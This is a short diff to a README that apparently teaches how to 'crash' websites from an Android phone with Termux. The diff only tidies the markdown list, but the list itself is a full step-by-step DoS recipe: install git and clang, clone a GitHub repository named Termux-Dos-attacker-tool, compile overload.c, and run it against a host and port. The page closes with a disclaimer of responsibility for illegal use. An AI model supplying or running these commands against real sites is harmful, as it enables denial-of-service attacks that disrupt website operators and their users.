@@ -11,22 +11,15 @@ Site Crash with Termux? Since this process is done by Telephone, that is, via Te
 
 Since this is a minor attack, it does not affect Large sites (Google, Facebook, etc.) Termux Xerxes installation? Download Termux from Google Play…
 
-#commands⬇️
+# commands⬇️
 
- -`apt update`
-
- -`apt upgrade`
-
- -`pkg install git`
-
- -`pkg install clang`
-
- -`git clone https://github.com/abirhosenakram/Termux-Dos-attacker-tool`
-
- -`cd overload`
-
- -`clang overload.c -o overload`
-
- -`./overload www.example.com 80`
+ - `apt update`
+ - `apt upgrade`
+ - `pkg install git`
+ - `pkg install clang`
+ - `git clone https://github.com/abirhosenakram/Termux-Dos-attacker-tool`
+ - `cd overload`
+ - `clang overload.c -o overload`
+ - `./overload www.example.com 80`
 
 # ⚠we aren't responsible for any illegal activities 
